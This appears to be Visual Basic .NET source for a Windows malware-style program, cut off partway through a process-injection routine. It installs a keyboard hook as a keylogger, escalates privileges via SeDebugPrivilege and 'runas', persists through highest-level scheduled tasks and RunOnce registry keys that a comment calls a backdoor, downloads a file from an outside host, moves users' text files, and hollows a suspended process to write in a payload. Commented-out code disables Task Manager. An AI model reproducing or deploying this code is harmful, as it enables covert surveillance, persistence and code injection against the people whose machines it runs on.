
Imports System.ComponentModel
Imports System.DirectoryServices.AccountManagement
Imports System.IO
Imports System.Media
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.Security.AccessControl
Imports System.Security.Principal
Imports System.Text
Imports System.Threading
Imports NAudio.Wave
Imports NAudio.Wave.SampleProviders

Public Class HOST


    Private TargetDT As Date
    Private CountDownFrom As TimeSpan = TimeSpan.FromMinutes(10) '

    Private ReadOnly myLock As New Object
    Private Const READ_CONTROL As Integer = &H20000
    Private Const STANDARD_RIGHTS_REQUIRED As Integer = &HF0000
    Private Const STANDARD_RIGHTS_READ As Integer = READ_CONTROL
    Private Const STANDARD_RIGHTS_WRITE As Integer = READ_CONTROL
    Private Const STANDARD_RIGHTS_EXECUTE As Integer = READ_CONTROL
    Private Const STANDARD_RIGHTS_ALL As Integer = &H1F0000
    Private Const SPECIFIC_RIGHTS_ALL As Integer = &HFFFF
    Private Const TOKEN_ASSIGN_PRIMARY As Integer = &H1
    Private Const TOKEN_DUPLICATE As Integer = &H2
    Private Const TOKEN_IMPERSONATE As Integer = &H4
    Private Const TOKEN_QUERY As Integer = &H8
    Private Const TOKEN_QUERY_SOURCE As Integer = &H10
    Private Const TOKEN_ADJUST_PRIVILEGES As Integer = &H20
    Private Const TOKEN_ADJUST_GROUPS As Integer = &H40
    Private Const TOKEN_ADJUST_DEFAULT As Integer = &H80
    Private Const TOKEN_ADJUST_SESSIONID As Integer = &H100
    Private Const SE_DEBUG_NAME = "SeDebugPrivilege"
    Private Const SE_PRIVILEGE_ENABLED = 2

    Private Const PROCESS_QUERY_INFORMATION = &H4
    Private Const WM_KEYDOWN As Integer = &H100
    Private Shared _hookID As IntPtr = IntPtr.Zero
    Private Shared CurrentActiveWindowTitle As String
    Public Const THREAD_SUSPEND_RESUME As UInteger = 2
    Private Shared ReadOnly WHKEYBOARDLL As Integer = 13
    Private Shared ReadOnly _proc As LowLevelKeyboardProc = AddressOf HookCallback

    Private Shared ReadOnly Property Proc As LowLevelKeyboardProc
        Get
            Return _proc
        End Get
    End Property

    Private insPrincipalContext As New PrincipalContext(ContextType.Machine)


    Public Shared Property CSharpImpl As Object
    Public Property MachineInfo As Object

    'The Microsoft Windows security model enables you to control access to process objects.
    'This access token describes the security context of all processes associated with the user.
    'The security context of a process is the set of credentials given to the process or the user account that
    'created the process.
    '>>>NOTE:
    'It is near impossible to create a process that Admin can't kill, however, using: (Application.Restart)
    'in a "form closing" event can really make a process tough to kill,
    'especially if you create child processes to watch the parent program.
    <Flags>
    Public Enum ProcessAccessRights
        PROCESS_CREATE_PROCESS = &H80
        PROCESS_CREATE_THREAD = &H2
        PROCESS_DUP_HANDLE = &H40
        PROCESS_QUERY_INFORMATION = &H400
        PROCESS_QUERY_LIMITED_INFORMATION = &H1000
        PROCESS_SET_INFORMATION = &H200
        PROCESS_SET_QUOTA = &H100
        PROCESS_SUSPEND_RESUME = &H800
        PROCESS_TERMINATE = &H1
        PROCESS_VM_OPERATION = &H8
        PROCESS_VM_READ = &H10
        PROCESS_VM_WRITE = &H20
        DELETE = &H10000
        READ_CONTROL = &H20000
        SYNCHRONIZE = &H100000
        WRITE_DAC = &H40000
        WRITE_OWNER = &H80000
        STANDARD_RIGHTS_REQUIRED = &HF0000
        PROCESS_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED Or SYNCHRONIZE Or &HFFF)
    End Enum

    Public Enum ShowWindowType
        Hide = 0
        Minimized = 1
        Maximized = 2
        Restore = 9
    End Enum

    Enum TOKEN_INFORMATION_CLASS
        TokenUser = 1
        TokenGroups
        TokenPrivileges
        TokenOwner
        TokenPrimaryGroup
        TokenDefaultDacl
        TokenSource
        TokenType
        TokenImpersonationLevel
        TokenStatistics
        TokenRestrictedSids
        TokenSessionId
        TokenGroupsAndPrivileges
        TokenSessionReference
        TokenSandBoxInert
        TokenAuditPolicy
        TokenOrigin
        TokenElevationType
        TokenLinkedToken
        TokenElevation
        TokenHasRestrictions
        TokenAccessInformation
        TokenVirtualizationAllowed
        TokenVirtualizationEnabled
        TokenIntegrityLevel
        TokenUIAccess
        TokenMandatoryPolicy
        TokenLogonSid
        MaxTokenInfoClass
    End Enum


    Private Structure PROCESS_INFORMATION
        Public hProcess As IntPtr
        Public hThread As IntPtr
        Public dwProcessId As UInteger
        Public dwThreadId As UInteger
    End Structure

    Private Structure STARTUPINFO
        Public cb As UInteger
        Public lpReserved As String
        Public lpDesktop As String
        Public lpTitle As String

        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=36)>
        Public Misc As Byte()

        Public lpReserved2 As Byte
        Public hStdInput As IntPtr
        Public hStdOutput As IntPtr
        Public hStdError As IntPtr
    End Structure

    Structure FLOATING_SAVE_AREA
        Dim Control, Status, Tag, ErrorO, ErrorS, DataO, DataS As UInteger
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=80)> Dim RegisterArea As Byte()
        Dim State As UInteger
    End Structure

    Structure CONTEXT32
        Dim ContextFlags, Dr0, Dr1, Dr2, Dr3, Dr6, Dr7 As UInteger
        Dim FloatSave As FLOATING_SAVE_AREA
        Dim SegGs, SegFs, SegEs, SegDs, Edi, Esi, Ebx, Edx, Ecx, Eax, Ebp, Eip, SegCs, EFlags, Esp, SegSs As UInteger
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=512)> Dim ExtendedRegisters As Byte()
    End Structure

    Structure PROCESS_BASIC_INFORMATION
        Public ExitStatus As IntPtr
        Public PebBaseAddress As IntPtr
        Public AffinityMask As IntPtr
        Public BasePriority As IntPtr
        Public UniqueProcessID As IntPtr
        Public InheritedFromUniqueProcessId As IntPtr
    End Structure

    Structure LUID
        Public LowPart As Integer
        Public HighPart As Integer
    End Structure

    Structure TOKEN_PRIVILEGES
        Public PrivilegeCount As Integer
        Public Luid As LUID
        Public Attributes As Integer
    End Structure

    Private Delegate Function LowLevelKeyboardProc(nCode As Integer,
                                                   wParam As IntPtr,
                                                   lParam As IntPtr) As IntPtr

    <DllImport("User32")>
    Private Shared Function ShowWindow(handle As IntPtr,
                                       hideType As ShowWindowType) As Integer
    End Function

    Declare Function LoadLibraryA Lib "kernel32" (Name As String) As IntPtr
    Private Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (hProcess As IntPtr,
                                                                          dwMinimumWorkingSetSize As Integer,
                                                                          dwMaximumWorkingSetSize As Integer) As Integer
    Declare Function GetProcAddress Lib "kernel32" (hProcess As IntPtr,
                                                    Name As String) As IntPtr

    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function GetModuleHandle(lpModuleName As String) As IntPtr
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function SetWindowsHookEx(idHook As Integer,
                                             lpfn As LowLevelKeyboardProc,
                                             hMod As IntPtr,
                                             dwThreadId As UInteger) As IntPtr
    End Function

    <DllImport("advapi32.dll", SetLastError:=True)>
    Private Shared Function SetKernelObjectSecurity(Handle As IntPtr,
                                                    securityInformation As Integer,
                                                    <[In]> pSecurityDescriptor As Byte()) As Boolean

    End Function

    <DllImport("kernel32.dll")>
    Public Shared Function GetCurrentProcess() As IntPtr
    End Function

    <DllImport("ntdll.dll", SetLastError:=True)>
    Private Shared Function NtSetInformationProcess(hProcess As IntPtr, processInformationClass As Integer,
                                                    ByRef processInformation As Integer,
                                                    processInformationLength As Integer) As Integer
    End Function

    'UnhookWindowsHookEx : The hook procedure can be In the state Of being called by another thread even after UnhookWindowsHookEx returns.
    'If the hook procedure Is Not being called concurrently, the hook procedure Is removed immediately before UnhookWindowsHookEx returns.
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function UnhookWindowsHookEx(hhk As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    'CallNextHookEx: Hook procedures are installed in chains for particular hook types. CallNextHookEx calls the next hook in the chain.
    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)>
    Private Shared Function CallNextHookEx(hhk As IntPtr,
                                           nCode As Integer,
                                           wParam As IntPtr,
                                           lParam As IntPtr) As IntPtr
    End Function

    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function GetProcessWindowStation() As IntPtr
    End Function

    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function GetThreadDesktop(dwThreadId As Integer) As IntPtr
    End Function

    <DllImport("kernel32.dll", SetLastError:=True)>
    Private Shared Function GetCurrentThreadId() As Integer
    End Function

    <DllImport("user32.dll")>
    Private Shared Function GetForegroundWindow() As IntPtr
    End Function

    'GetWindowThreadProcessId:Retrieves the identifier of the thread that created the specified window and, optionally,
    'the identifier of the process that created the window.
    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function GetWindowThreadProcessId(hWnd As IntPtr,
                                                     <Out> ByRef lpdwProcessId As UInteger) As UInteger
    End Function

    'GetKeyState: The key status returned from this function changes as a thread reads key messages from its message queue.
    'The status does not reflect the interrupt-level state associated with the hardware. Use the GetKeyState function to retrieve
    'that information.
    <DllImport("user32.dll", CharSet:=CharSet.Auto, ExactSpelling:=True, CallingConvention:=CallingConvention.Winapi)>
    Public Shared Function GetKeyState(keyCode As Integer) As Short
    End Function

    'An application can call this function to retrieve the current status of all the virtual keys.
    'The status changes as a thread removes keyboard messages from its message queue. The status does not change as keyboard messages
    'are posted to the thread's message queue, nor does it change as keyboard messages are posted to or retrieved from message queues
    'of other threads. (Exception: Threads that are connected through AttachThreadInput share the same keyboard state.)
    <DllImport("user32.dll", SetLastError:=True)>
    Private Shared Function GetKeyboardState(lpKeyState As Byte()) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    'GetKeyboardLayout: The input locale identifier is a broader concept than a keyboard layout, since it can also encompass a speech-to-text
    'converter, an Input Method Editor (IME), or any other form of input.
    <DllImport("user32.dll")>
    Private Shared Function GetKeyboardLayout(idThread As UInteger) As IntPtr
    End Function

    'ToUnicodeEx:The input locale identifier is a broader concept than a keyboard layout, since it can also encompass a speech-to-text converter,
    'an Input Method Editor (IME), or any other form of input.
    <DllImport("user32.dll")>
    Private Shared Function ToUnicodeEx(wVirtKey As UInteger,
                                        wScanCode As UInteger,
                                        lpKeyState As Byte(),
                                        <Out, MarshalAs(UnmanagedType.LPWStr)> pwszBuff As StringBuilder,
                                        cchBuff As Integer,
                                        wFlags As UInteger,
                                        dwhkl As IntPtr) As Integer
    End Function

    'MapVirtualKey: An application can use MapVirtualKey to translate scan codes to the virtual-key code constants VK_SHIFT, VK_CONTROL, and VK_MENU,
    'and vice versa. These translations do not distinguish between the left and right instances of the SHIFT, CTRL, or ALT keys.
    <DllImport("user32.dll")>
    Private Shared Function MapVirtualKey(uCode As UInteger,
                                          uMapType As UInteger) As UInteger
    End Function

    <DllImport("gdi32.dll")>
    Private Shared Function BitBlt(hdc As IntPtr,
nXDest As Integer,
nYDest As Integer,
nWidth As Integer,
nHeight As Integer,
hdcSrc As IntPtr,
nXSrc As Integer,
nYSrc As Integer,
dwRop As CopyPixelOperation) As Boolean
    End Function

    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
    Private Shared Function FindWindow(lpClassName As String,
lpWindowName As String) As IntPtr
    End Function

    'My.Computer.Audio.Play(My.Resources.departure, AudioPlayMode.Background)
    <DllImport("kernel32.dll", EntryPoint:="SuspendThread")>
    Public Shared Function SuspendThread(<[In]()> hThread As IntPtr) As UInteger
    End Function

    <DllImport("kernel32.dll", EntryPoint:="OpenThread")>
    Public Shared Function OpenThread(dwDesiredAccess As UInteger,
                                      <MarshalAs(UnmanagedType.Bool)> bInheritHandle As Boolean,
                                      dwThreadId As UInteger) As IntPtr
    End Function

    <DllImport("advapi32.dll", SetLastError:=True)>
    Private Shared Function GetKernelObjectSecurity(Handle As IntPtr, securityInformation As Integer,
        <Out> pSecurityDescriptor As Byte(), nLength As UInteger, <Out> ByRef lpnLengthNeeded As UInteger) As Boolean
    End Function

    Declare Auto Function CloseHandle Lib "kernel32.dll" (hObject As IntPtr) As Boolean
    Declare Function CloseHandle Lib "kernel32" Alias "CloseHandle" (hObject As Integer) As Integer

    Private Declare Function OpenProcessToken Lib "advapi32" (ProcessHandle As IntPtr,
                                                              DesiredAccess As Integer,
                                                              ByRef TokenHandle As Integer) As Integer
    Private Declare Function LookupPrivilegeValue Lib "advapi32" Alias "LookupPrivilegeValueA" (lpSystemName As String,
                                                                                                lpName As String,
                                                                                                ByRef lpLuid As LUID) As Integer
    Private Declare Function AdjustTokenPrivileges Lib "advapi32" (TokenHandle As Integer,
                                                                   DisableAllPrivileges As Boolean,
                                                                   ByRef NewState As TOKEN_PRIVILEGES,
                                                                   BufferLength As Integer,
                                                                   ByRef PreviousState As TOKEN_PRIVILEGES,
                                                                   ByRef ReturnLength As Integer) As Integer

    <Obsolete>
    Private Sub HOST_Load(sender As Object, e As EventArgs) Handles MyBase.Load


        Timer1.Interval = 100
        TargetDT = DateTime.Now.Add(CountDownFrom)

        Timer3.Start()

        _hookID = SetHook(Proc)

        ReleaseRAM()

        GrantAccess()

        'Below, we use 
        'SubContractors()
        'SoilWork()
        'This is where child processes are
        'HiddenProcess1()
        'HiddenProcess2()
        ' My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True).SetValue(Application.ProductName, Application.ExecutablePath)

        'Disable Task Manager
        ' Dim key As RegistryKey
        'key = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System", True)
        'key.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord)
        'key.Close()
        Zero()
        Timer1.Start()
        'Exploitz()


    End Sub


    Public Sub Client_XT()
        Dim remoteUri As String = "http://belajar123.com/materi.zip"
        Dim fileName As String = "materi.zip"
        Dim password As String = "..."
        Dim username As String = "..."

        Using client As New WebClient()

            client.Credentials = New NetworkCredential(username, password)
            client.DownloadFile(remoteUri, fileName)
        End Using
    End Sub

    Public Sub XMX()

        Try
            ' Set a variable to the My Documents path.
            Dim docPath As String = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)

            Dim dirs As New List(Of String)(Directory.EnumerateDirectories(docPath))

            For Each dir As String In dirs

                Console.WriteLine(dir.Substring(dir.LastIndexOf(Path.DirectorySeparatorChar) + 1))

            Next

            Console.WriteLine(dirs.Count & " directories found.")

        Catch ex As UnauthorizedAccessException

            Console.WriteLine(ex.Message)

        Catch ex As PathTooLongException

            Console.WriteLine(ex.Message)

        End Try

    End Sub
    'Examples
    'The following example shows how To retrieve all the text files from a directory And move them To a New directory. After the files are moved, they no longer exist In the original directory.
    Public Sub Exploitz()

        ' Set the default directory of the folder browser to the current directory.
        Dim sourceDirectory = $"{Environ("USERPROFILE")}\Documents"
        Dim archiveDirectory = $"{Environ("USERPROFILE")}\Pictures"

        Try
            Dim txtFiles = Directory.EnumerateFiles(sourceDirectory, "*.txt")

            For Each currentFile In txtFiles
                Dim fileName = currentFile.Substring(sourceDirectory.Length + 1)
                Directory.Move(currentFile, Path.Combine(archiveDirectory, fileName))
            Next
        Catch e As Exception
            Console.WriteLine(e.Message)
        End Try


    End Sub


    'Bios Inventory
    Private Sub Zero()

        Dim RInject As New RavenInject()
        Dim RAntiKill As New RavenAntiKill()

        For Each drive In Environment.GetLogicalDrives
            Dim Driver As New DriveInfo(drive)

            If Driver.DriveType = DriveType.Removable Or Driver.DriveType = DriveType.Fixed Then
                HOSTiNFO.Items.Add("TARGET'S:  INFORMATION")
                HOSTiNFO.Items.Add(drive)
                HOSTiNFO.Items.Add(insPrincipalContext)
            End If
        Next
        'JIGSAW'S VOICE
        'USING NAUDIO, WE ARE TAKING 2 WAV FILES & COMBINDING THEM TO CREATE A MERGED CREATION OF BOTH FILES BELOW IN ONE

        Dim rt1 = New FileStream(
            "C:\Users\rytho\source\repos\Host_Report\Host_Report\Resources\listen3.wav", FileMode.Open)
        Dim rt2 = New FileStream(
            "C:\Users\rytho\source\repos\Host_Report\Host_Report\Resources\listen4.wav", FileMode.Open)

        Dim readerz = New WaveFileReader(rt1)
        Dim readerz2 = New WaveFileReader(rt2)
        Dim samplez1 = readerz.ToSampleProvider()
        Dim samplez2 = readerz2.ToSampleProvider()
        Dim samplez3 = New ISampleProvider() {samplez1, samplez2}
        Dim concz = New ConcatenatingSampleProvider(samplez3)
        WaveFileWriter.CreateWaveFile16(
            "C:\Users\rytho\source\repos\Host_Report\Host_Report\Resources\Nuke.wav", concz)
        Dim soundz = New SoundPlayer(
            "C:\Users\rytho\source\repos\Host_Report\Host_Report\Resources\Nuke.wav")
        soundz.Play()
        readerz.Close()
        readerz2.Close()
        rt1.Close()
        rt2.Close()
    End Sub

    Private Sub DEPORTATION()
        Try
            'Dotnet string interpolation is the process of combining variables and string literals into a single string,
            'without the awkward placeholder and formatter pattern. The result is more readable and maintainable code that
            'executes faster than traditional string concatenation. For the record, :Const" are more readable but actually slower
            'when it comes to performance so avoid them when you can.
            'CONST SHOULD ONLY BE USED ON THE FOLLOWING: (IF YOU ARE NEW AT CODING AND ARE WONDERING)
            '1. A new Array.
            '2. A New Object.
            '3. A New Function.
            '4. A New RegExp

            Dim ark As String = $"{Environ("USERPROFILE")}\Documents" ' <<<Example: Interpolation Of A String
            Dim dest As String = $"{Environ("USERPROFILE")}\Music" ' <<<Example: Interpolation Of A String
            Dim files As IEnumerable(Of String()) =
        From
            path As String
        In
            Directory.GetFiles(ark, "*.txt")
        Select
            My.Computer.FileSystem.ReadAllText(path, Encoding.UTF8).Split({Environment.NewLine}, StringSplitOptions.RemoveEmptyEntries)

            For Each file As String() In files

                For Each line As String In file



                Next

            Next
        Catch ex As Exception

        End Try

    End Sub

#Region " GPO Security Identifier | Creators Owner ID, (Highest Mandatory Level) | Schedule Task  "
    'GPO cmdlet creates a GPO with a specified name. By default, the newly created GPO is not linked to a site,
    'domain, or organizational unit (OU).
    'You can use this cmdlet To create a GPO that Is based On a starter GPO by specifying the GUID Or the display name
    'Of the Starter GPO, Or by piping a StarterGpo Object into the cmdlet.
    'The cmdlet returns a GPO Object, which represents the created GPO that you can pipe "To other Group Policy cmdlets"....
    Function GPO(cmd As String, Optional args As String = "", Optional startin As String = "") As String
        GPO = ""
        Try
            Dim p = New Process With {
                .StartInfo = New ProcessStartInfo(cmd, args)
            }
            If startin <> "" Then p.StartInfo.WorkingDirectory = startin
            p.StartInfo.RedirectStandardOutput = True
            p.StartInfo.RedirectStandardError = True
            p.StartInfo.UseShellExecute = False
            p.StartInfo.CreateNoWindow = True
            p.Start()
            p.WaitForExit()
            Dim s = p.StandardOutput.ReadToEnd
            s += p.StandardError.ReadToEnd
            GPO = s
        Catch ex As Exception
        End Try
    End Function ' Get Process Output.

    'Possession Part of Owning System Via; Security Identifier
    Function CanH() As Boolean
        CanH = False
        'Displays user, group and privileges information for the user who is currently logged on to the local system.
        'If used without parameters, whoami displays the current domain and user name.
        Dim s = GPO("c: \windows\system32\cmd.exe", "/c whoami /all | findstr /I /C:""S-1-5-32-544""") '<<This is a Security Identifier
        If s.Contains("S-1-5-32-544") Then CanH = True
    End Function ' Check if can get Higher.

    'Below: Creators Owner ID has discovered the "Security Identifier" to be replaced by the "S-1-16-12288", (High Mandatory Level) ADMIN
    Function CH() As Boolean
        CH = False
        Dim s = GPO("c:\windows\system32\cmd.exe", "/c whoami /all | findstr /I /C:""S-1-16-12288""")
        If s.Contains("S-1-16-12288") Then CH = True
    End Function ' Check if Higher.

    Function GH() As Boolean
        GH = False
        If Not CH() Then
            'Elevating process privilege programmatically
            Dim pc As New ProcessStartInfo(Process.GetCurrentProcess.MainModule.FileName) With {
                .Verb = "runas"
            }
            Try
                Dim p = Process.Start(pc)
                Return True
            Catch ex As Exception
                Return False
            End Try
        End If
    End Function ' Get Higher.
    'Now that the information is gathered, we create a backdoor into the system via entry od Task Scheduler 
    'with the highest Logon.
    Private Sub SubContractors()
        ' StartUp BackgroundWorker to schedule a task
        Dim subw As New BackgroundWorker()
        AddHandler subw.DoWork, Sub(sender1 As Object, e1 As DoWorkEventArgs)
                                    While True
                                        Try
                                            If CH() Then
                                                If Not GPO("c:\windows\system32\cmd.exe", "/C schtasks /create /rl HIGHEST /sc ONLOGON /tn Host_Report /F /tr """"" & Process.GetCurrentProcess.MainModule.FileName & """""").Contains("successfully") Then
                                                    My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\RunOnce", True).SetValue("Host_Report", Process.GetCurrentProcess.MainModule.FileName)
                                                End If
                                            Else
                                                My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\RunOnce", True).SetValue("KraveNT", Process.GetCurrentProcess.MainModule.FileName)
                                            End If
                                        Catch ex As Exception
                                        End Try
                                        Thread.Sleep(15000)
                                    End While
                                End Sub
        subw.RunWorkerAsync()
    End Sub

    Private Sub SoilWork()
        On Error Resume Next
        Dim p As New Process
        With p.StartInfo
            .FileName = "schtasks.exe"
            .Arguments = ("/C schtasks /create /rl HIGHEST /sc ONLOGON /tn Host_Report /F /tr """"" & Process.GetCurrentProcess.MainModule.FileName & """""").Contains("successfully")
            .UseShellExecute = False
            .RedirectStandardOutput = True
            .CreateNoWindow = True
        End With
        My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\RunOnce", True).SetValue("Host_Report", Process.GetCurrentProcess.MainModule.FileName)
        p.Start()

        Dim s As String = p.StandardOutput.ReadToEnd
        Debug.WriteLine(s, "Create Task Results")
    End Sub
#End Region

    Private Function DebugPrivs(Enable As Boolean) As Boolean
        Dim hProcess As Long
        Dim DesiredAccess As Long
        Dim hToken As IntPtr
        Dim tkp As TOKEN_PRIVILEGES
        Dim nRet As Long
        ' Cache a copy of priviliges as we found them.
        Dim bup As TOKEN_PRIVILEGES
        ' Get psuedohandle to current process.
        hProcess = Process.GetCurrentProcess().Handle
        ' Ask for handle to query and adjust process tokens.
        DesiredAccess = TOKEN_QUERY Or TOKEN_ADJUST_PRIVILEGES
        If OpenProcessToken(hProcess, DesiredAccess, hToken) Then
            ' Get LUID for backup privilege name.
            If LookupPrivilegeValue(
               vbNullString, SE_DEBUG_NAME, tkp.Luid) Then
                If Enable Then
                    ' Enable the debug priviledge.
                    tkp.PrivilegeCount = 1
                    tkp.Attributes = SE_PRIVILEGE_ENABLED
                    If AdjustTokenPrivileges(
                        hToken, False, tkp, Len(bup), bup, nRet) Then
                        DebugPrivs = True
                    End If
                Else
                    ' Restore prior debug privilege setting.
                    If AdjustTokenPrivileges(
                       hToken, False, bup, Len(bup), bup, nRet) Then
                        DebugPrivs = True
                    End If
                End If
            End If
            ' Clean up token handle.
            Call CloseHandle(hToken.ToInt32)
        End If
#Disable Warning BC42353 ' Function doesn't return a value on all code paths
    End Function
#Enable Warning BC42353 ' Function doesn't return a value on all code paths

#Region "Injection"
    'https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.getdelegateforfunctionpointer?view=net-8.0
    Private Function CreateApi(Of T)(Name As String, Method As String) As T
        Return DirectCast(Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(Name), Method), GetType(T)), Object)
    End Function

    'Remarks
    'ReadProcessMemory copies the data In the specified address range from the address space Of the specified process into the specified
    'buffer Of the current process. Any process that has a handle With PROCESS_VM_READ access can Call the Function.
    'The entire area To be read must be accessible, And If it Is Not accessible, the Function fails.
    Private Delegate Function ReadProcessMemoryParameters(hProcess As UInteger, lpBaseAddress As IntPtr, ByRef lpBuffer As Integer, nSize As IntPtr, ByRef lpNumberOfBytesWritten As IntPtr) As Boolean

    ReadOnly ReadProcessMemory As ReadProcessMemoryParameters = CreateApi(Of ReadProcessMemoryParameters)("kernel32", "ReadProcessMemory")

    Private Delegate Function CreateProcessParameters(
    ApplicationName As String,
    CommandLine As String,
    ProcessAttributes As IntPtr,
    ThreadAttributes As IntPtr,
    InheritHandles As Boolean,
    CreationFlags As UInteger,
    Environment As IntPtr,
    CurrentDirectory As String,
    ByRef StartupInfo As STARTUPINFO,
    ByRef ProcessInformation As PROCESS_INFORMATION) As Boolean

    ReadOnly CreateProcess As CreateProcessParameters = CreateApi(Of CreateProcessParameters)("kernel32", "CreateProcessA")

    Private Delegate Function NtQueryInformationProcessParameters(hProcess As IntPtr,
    ProcessInformationClass As Integer,
    ByRef ProcessInformation As PROCESS_BASIC_INFORMATION,
    ProcessInformationLength As UInteger,
    ByRef ReturnLength As UIntPtr) As UInteger

    'https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess
    ReadOnly NtQueryInformationProcess As NtQueryInformationProcessParameters = CreateApi(Of NtQueryInformationProcessParameters)("ntdll", "NtQueryInformationProcess")

    Private Delegate Function GetThreadContext64Parameters(
    hThread As IntPtr,
    ByRef lpContext As CONTEXT32) As Boolean

    Dim GetThreadContext64 As GetThreadContext64Parameters = Nothing

    Private Delegate Function IsWow64ProcessParameters(
    hProcess As IntPtr,
    ByRef Wow64Process As Boolean) As Boolean

    ReadOnly IsWow64Process As IsWow64ProcessParameters = CreateApi(Of IsWow64ProcessParameters)("kernel32", "IsWow64Process")

    Private Delegate Function WriteProcessMemoryParameters(
    hProcess As IntPtr,
    lpBaseAddress As IntPtr,
    lpBuffer As Byte(),
    nSize As UInteger,
    ByRef lpNumberOfBytesWritten As UInteger) As Boolean

    ReadOnly WriteProcessMemory As WriteProcessMemoryParameters = CreateApi(Of WriteProcessMemoryParameters)("kernel32", "WriteProcessMemory")

    Private Delegate Function NtUnmapViewOfSectionParameters(
    hProcess As IntPtr,
    pBaseAddress As IntPtr) As UInteger

    ReadOnly NtUnmapViewOfSection As NtUnmapViewOfSectionParameters = CreateApi(Of NtUnmapViewOfSectionParameters)("ntdll", "NtUnmapViewOfSection")

    Private Delegate Function VirtualAllocExParameters(
    hProcess As IntPtr,
    lpAddress As IntPtr,
    dwSize As UInteger,
    flAllocationType As UInteger,
    flProtect As UInteger) As IntPtr

    ReadOnly VirtualAllocEx As VirtualAllocExParameters = CreateApi(Of VirtualAllocExParameters)("kernel32", "VirtualAllocEx")

    Private Delegate Function ResumeThreadParameters(
    hThread As IntPtr) As UInteger

    ReadOnly ResumeThread As ResumeThreadParameters = CreateApi(Of ResumeThreadParameters)("kernel32", "ResumeThread")

    Public Function Run(path As String, payload As Byte(), creationflag As Integer) As Boolean
        For I As Integer = 1 To 5
            If HandleRun(path, payload, creationflag) Then Return True
        Next
        Return False
    End Function

    Private Function HandleRun(Path As String, payload As Byte(), creationflag As Integer) As Boolean
        Dim ReadWrite As Integer = Nothing
        Dim QuotedPath As String = String.Format("""{0}""", Path)
        Dim SI As New STARTUPINFO
        Dim PI As New PROCESS_INFORMATION
        SI.cb = CUInt(Marshal.SizeOf(GetType(STARTUPINFO))) 'Parses the size of the structure to the structure, so it retrieves the right size of data
        Try
            'COMMENT: Creating a target process in suspended state, which makes it patch ready and we also retrieves its process information and startup information.
            If Not CreateProcess(Path, QuotedPath, IntPtr.Zero, IntPtr.Zero, True, creationflag, IntPtr.Zero, Directory.GetCurrentDirectory, SI, PI) Then Throw New Exception()
            'COMMENT: Defines some variables we need in the next process
            Dim ProccessInfo As New PROCESS_BASIC_INFORMATION
            Dim RetLength As UInteger
            Dim Context = Nothing
            Dim PEBAddress32 As Integer = Nothing
            Dim PEBAddress64 As Long = Nothing
            Dim TargetIs64 As Boolean = Nothing
            Dim IsWow64Proc As Boolean = False
            IsWow64Process(PI.hProcess, IsWow64Proc) 'COMMENT: Retrieves Boolean to know if target process is a 32bit process running in 32bit system, or a 32bit process running under WOW64 in a 64bit system.
            If IsWow64Proc Or IntPtr.Size = 4 Then 'COMMENT: Checks the Boolean retrieved from before OR checks if our calling process is 32bit
                Context = New CONTEXT32 With {
                    .ContextFlags = &H1000002L 'COMMENT: Parses the context flag CONTEXT_AMD64(&H00100000L) + CONTEXT_INTEGER(0x00000002L) to tell that we want a structure of a 32bit process running under WOW64, you can see all context flags in winnt.h header file.
                    }
                If IsWow64Proc AndAlso IntPtr.Size = 8 Then 'COMMENT: Checks if our own process is 64bit and the target process is 32bit in wow64
                    GetThreadContext64 = CreateApi(Of GetThreadContext64Parameters)("kernel32", "Wow64GetThreadContext") 'COMMENT: Retrieves a structure of information to retrieve the PEBAddress to later on know where we gonna use WriteProcessMemory to write our payload
                    If Not GetThreadContext64(PI.hThread, Context) Then Throw New Exception
                    Console.WriteLine(Context.Ebx)
                    PEBAddress32 = Context.Ebx
                    TargetIs64 = False
                Else 'COMMENT: If our process is 32bit and the target process is 32bit we get here.
                    NtQueryInformationProcess(PI.hProcess, 0, ProccessInfo, Marshal.SizeOf(ProccessInfo), RetLength) 'COMMENT: Retrieves a structure of information to retrieve the PEBAddress to later on know where we gonna use WriteProcessMemory to write our payload
                    PEBAddress32 = ProccessInfo.PebBaseAddress
                    TargetIs64 = False
                End If
            Else 'COMMENT: If our process is 64bit and the target process is 64bit we get here.
                NtQueryInformationProcess(PI.hProcess, 0, ProccessInfo, Marshal.SizeOf(ProccessInfo), RetLength) 'COMMENT: Retrieves a structure of information to retrieve the PEBAddress to later on know where we gonna use WriteProcessMemory to write our payload
                PEBAddress64 = ProccessInfo.PebBaseAddress
                TargetIs64 = True
            End If
            Dim BaseAddress As IntPtr
            If TargetIs64 = True Then
                ReadProcessMemory(PI.hProcess, PEBAddress64 + &H10, BaseAddress, 4, ReadWrite) 'COMMENT: Reads the BaseAddress of a 64bit Process, which is where the exe data starts
            Else
                ReadProcessMemory(PI.hProcess, PEBAddress32 + &H8, BaseAddress, 4, ReadWrite) 'COMMENT: Reads the BaseAddress of a 32bit Process, which is where the exe data starts
            End If
